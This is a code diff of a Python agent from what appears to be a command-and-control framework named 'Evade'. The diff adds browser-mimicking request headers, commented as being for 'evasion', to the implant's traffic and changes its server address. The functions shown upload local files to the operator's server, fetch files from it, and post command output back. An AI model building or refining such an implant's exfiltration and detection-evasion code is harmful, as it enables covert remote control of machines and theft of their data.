@@ -5,9 +5,25 @@ import uuid
 import os
 import sys
 
-#SERVER_CERT=r'E:\Github\Repos\Evade-A-C2-Framework\test\https_complete\server.crt'
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Connection": "keep-alive",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Site": "none",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-User": "?1",
+    "Sec-Fetch-Dest": "document",
+    "Referer": "https://www.Rochak.com/",  # Optional: Use if there's a specific referrer you want to mimic
+    "DNT": "1",  # Do Not Track request header
+    "Cache-Control": "max-age=0",
+    # Custom headers for further evasion or required by the server
+}
 
-SERVER_URL = 'https://10.10.2.214:5001'
+
+SERVER_URL = 'https://192.168.1.210:5001'
 AGENT_ID = str(uuid.uuid4())
 REGISTER_ENDPOINT = f'{SERVER_URL}/register'
 COMMAND_ENDPOINT = f'{SERVER_URL}/get_command'
@@ -64,7 +80,8 @@ def upload_file_to_server(filename):
     if os.path.exists(file_path):
         with open(file_path, 'rb') as f:
             files = {'file': (filename, f)}
-            response = requests.post(OUTPUT_ENDPOINT, files=files, data={'agent_id': AGENT_ID}, verify=SERVER_CERT, allow_redirects=True)
+            response = requests.post(OUTPUT_ENDPOINT, files=files, data={'agent_id': AGENT_ID}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
+            #response = requests.post(OUTPUT_ENDPOINT, files=files, data={'agent_id': AGENT_ID}, verify=SERVER_CERT, allow_redirects=True)
             if response.status_code == 200:
                 return "File Downloaded successfully."
             else:
@@ -75,7 +92,8 @@ def upload_file_to_server(filename):
 def download_file_from_server(filename):
     # Adjust to the new server endpoint for fetching files
     download_url = f"{SERVER_URL}/fetch_file/{AGENT_ID}/{filename}"
-    response = requests.get(download_url, verify=SERVER_CERT, allow_redirects=True)
+    response = requests.get(download_url, headers=headers, verify=SERVER_CERT, allow_redirects=True)
+    #response = requests.get(download_url, verify=SERVER_CERT, allow_redirects=True)
     if response.status_code == 200:
         file_path = os.path.join(os.getcwd(), filename)  # Save in the current working directory
         with open(file_path, 'wb') as f:
@@ -86,7 +104,8 @@ def download_file_from_server(filename):
 
 def send_output(output):
     try:
-        response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output}, verify=SERVER_CERT, allow_redirects=True)
+        response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
+        #response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output}, verify=SERVER_CERT, allow_redirects=True)
         print("Response Status:", response.status_code)
         print("Response Text:", response.text)
         if response.ok:
